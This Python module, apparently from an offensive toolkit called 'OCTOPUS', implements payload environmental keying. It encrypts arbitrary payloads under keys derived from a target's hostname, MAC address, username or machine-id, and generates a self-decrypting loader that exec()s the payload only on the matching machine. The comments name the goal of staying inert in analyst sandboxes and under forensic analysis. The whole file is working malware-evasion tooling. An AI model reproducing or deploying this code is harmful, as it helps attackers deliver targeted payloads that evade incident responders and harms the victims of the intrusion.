#!/usr/bin/env python3
"""
Environmental keying for payloads (inspired by Lazarus RemotePE / DPAPI technique).

Payload encryption bound to target machine properties:
- Hostname, MAC address, username, machine-id
- If payload is exfiltrated to analyst sandbox, it remains encrypted/inert.

MITRE ATT&CK: T1480.001 (Environmental Keying)

Usage:
    from modules.evasion.payload_keying import PayloadKeying
    pk = PayloadKeying()
    keyed = pk.key_to_hostname(payload_bytes, "target-hostname")
    loader_code = pk.generate_loader(keyed, "hostname")
"""

import os
import hashlib
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ---- ANSI ----
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_RED = "\033[91m"
C_CYAN = "\033[96m"
C_RESET = "\033[0m"


class PayloadKeying:
    """Environmental keying -- encrypt payloads bound to target machine context.

    Concept (from Lazarus RemotePE article):
    - Payload encrypted with key derived from target's environment (hostname, MAC, etc.)
    - Decryption only works ON the target machine where the env matches
    - If payload is captured by IR/forensics, it's inert on any other machine
    """

    def __init__(self):
        self.nonce_size = 12  # AES-GCM standard nonce size

    def _derive_key(self, env_value: str, salt: str = "octopus_v8") -> bytes:
        """Derive AES-256 key from environment value using PBKDF2."""
        import hashlib
        key = hashlib.pbkdf2_hmac(
            "sha256",
            env_value.encode("utf-8"),
            salt.encode("utf-8"),
            iterations=100_000,
            dklen=32  # 256-bit key
        )
        return key

    def _encrypt(self, data: bytes, key: bytes) -> bytes:
        """AES-256-GCM encryption. Returns: nonce + ciphertext + tag."""
        nonce = os.urandom(self.nonce_size)
        aesgcm = AESGCM(key)
        ct = aesgcm.encrypt(nonce, data, None)
        return nonce + ct  # nonce(12) + ciphertext + tag(16)

    def _decrypt(self, encrypted: bytes, key: bytes) -> bytes:
        """AES-256-GCM decryption."""
        nonce = encrypted[:self.nonce_size]
        ct = encrypted[self.nonce_size:]
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ct, None)

    # ---- KEYING METHODS ----

    def key_to_hostname(self, payload: bytes, hostname: str) -> bytes:
        """Encrypt payload bound to target hostname.
        Only decryptable on machine with matching hostname."""
        key = self._derive_key(hostname.strip().lower())
        encrypted = self._encrypt(payload, key)
        print(f"  {C_GREEN}[+] Payload keyed to hostname: {hostname}{C_RESET}")
        return encrypted

    def key_to_mac(self, payload: bytes, mac_addr: str) -> bytes:
        """Encrypt payload bound to target MAC address."""
        mac_clean = mac_addr.strip().lower().replace("-", ":").replace(".", ":")
        key = self._derive_key(mac_clean)
        encrypted = self._encrypt(payload, key)
        print(f"  {C_GREEN}[+] Payload keyed to MAC: {mac_addr}{C_RESET}")
        return encrypted

    def key_to_user(self, payload: bytes, username: str) -> bytes:
        """Encrypt payload bound to target username."""
        key = self._derive_key(username.strip().lower())
        encrypted = self._encrypt(payload, key)
        print(f"  {C_GREEN}[+] Payload keyed to user: {username}{C_RESET}")
        return encrypted

    def key_to_machine_id(self, payload: bytes, machine_id: str) -> bytes:
        """Encrypt payload bound to /etc/machine-id (Linux unique identifier)."""
        key = self._derive_key(machine_id.strip())
        encrypted = self._encrypt(payload, key)
        print(f"  {C_GREEN}[+] Payload keyed to machine-id{C_RESET}")
        return encrypted

    def key_to_multi(self, payload: bytes, hostname: str = "",
                     username: str = "", mac: str = "") -> bytes:
        """Multi-factor keying -- combine multiple env values.
        More factors = harder to replicate in sandbox."""
        combined = f"{hostname.strip().lower()}|{username.strip().lower()}|{mac.strip().lower()}"
        key = self._derive_key(combined, salt="octopus_multi_v8")
        encrypted = self._encrypt(payload, key)
        print(f"  {C_GREEN}[+] Payload multi-keyed (hostname+user+mac){C_RESET}")
        return encrypted

    # ---- LOADER GENERATION ----

    def generate_loader(self, keyed_payload: bytes, key_source: str = "hostname") -> str:
        """Generate Python loader that extracts key from environment and decrypts payload.

        Args:
            keyed_payload: Encrypted payload bytes
            key_source: "hostname", "mac", "user", "machine_id", or "multi"

        Returns:
            Python source code string for the self-decrypting loader.
        """
        payload_b64 = base64.b64encode(keyed_payload).decode()

        # Key extraction code per source type
        key_extractors = {
            "hostname": 'import socket; env_val = socket.gethostname().strip().lower()',
            "mac": (
                'import uuid; '
                'mac = ":".join(f"{b:02x}" for b in uuid.getnode().to_bytes(6, "big")); '
                'env_val = mac'
            ),
            "user": 'import getpass; env_val = getpass.getuser().strip().lower()',
            "machine_id": (
                'env_val = open("/etc/machine-id").read().strip() '
                'if __import__("os").path.isfile("/etc/machine-id") else ""'
            ),
            "multi": (
                'import socket, getpass, uuid; '
                'mac = ":".join(f"{b:02x}" for b in uuid.getnode().to_bytes(6, "big")); '
                'env_val = f"{socket.gethostname().strip().lower()}'
                '|{getpass.getuser().strip().lower()}|{mac}"'
            ),
        }

        extractor = key_extractors.get(key_source, key_extractors["hostname"])
        salt = "octopus_multi_v8" if key_source == "multi" else "octopus_v8"

        loader = f'''#!/usr/bin/env python3
"""Auto-decrypting payload loader -- environmental keying.
Payload will only execute on the target machine."""
import base64, hashlib, os, sys

PAYLOAD_B64 = """{payload_b64}"""

def _derive_key(env_val, salt="{salt}"):
    return hashlib.pbkdf2_hmac("sha256", env_val.encode(), salt.encode(), 100000, 32)

def _decrypt(data, key):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    return AESGCM(key).decrypt(data[:12], data[12:], None)

def main():
    try:
        {extractor}
    except Exception:
        sys.exit(1)
    key = _derive_key(env_val)
    try:
        payload = _decrypt(base64.b64decode(PAYLOAD_B64), key)
        exec(payload)
    except Exception:
        pass  # Wrong environment -- payload stays encrypted

if __name__ == "__main__":
    main()
'''
        return loader

    # ---- CONVENIENCE ----

    def key_payload_for_target(self, payload: bytes, target_info: dict) -> tuple:
        """High-level: key payload using all available target info.

        Args:
            payload: Raw payload bytes
            target_info: dict with optional keys: hostname, username, mac, machine_id

        Returns:
            (keyed_payload_bytes, loader_code_str)
        """
        hostname = target_info.get("hostname", "")
        username = target_info.get("username", "")
        mac = target_info.get("mac", "")
        machine_id = target_info.get("machine_id", "")

        # Choose best keying strategy based on available info
        if hostname and username and mac:
            keyed = self.key_to_multi(payload, hostname, username, mac)
            loader = self.generate_loader(keyed, "multi")
            return keyed, loader
        elif machine_id:
            keyed = self.key_to_machine_id(payload, machine_id)
            loader = self.generate_loader(keyed, "machine_id")
            return keyed, loader
        elif hostname:
            keyed = self.key_to_hostname(payload, hostname)
            loader = self.generate_loader(keyed, "hostname")
            return keyed, loader
        elif username:
            keyed = self.key_to_user(payload, username)
            loader = self.generate_loader(keyed, "user")
            return keyed, loader
        else:
            print(f"  {C_YELLOW}[!] No target info for keying -- payload will be unkeyed{C_RESET}")
            return payload, ""


# ---- SELF-TEST ----

if __name__ == "__main__":
    print(f"\n{C_RED}    OCTOPUS -- Payload Keying Test{C_RESET}\n")
    pk = PayloadKeying()

    test_payload = b'print("Hello from keyed payload!")'

    # Test hostname keying
    keyed = pk.key_to_hostname(test_payload, "test-host")
    print(f"  Original:  {len(test_payload)} bytes")
    print(f"  Encrypted: {len(keyed)} bytes")

    # Verify decryption with correct key
    key = pk._derive_key("test-host")
    decrypted = pk._decrypt(keyed, key)
    assert decrypted == test_payload, "Decryption failed!"
    print(f"  {C_GREEN}[+] Decryption verified OK{C_RESET}")

    # Generate loader
    loader = pk.generate_loader(keyed, "hostname")
    print(f"  Loader: {len(loader)} chars")
    print(f"  {C_GREEN}[+] All tests passed{C_RESET}")
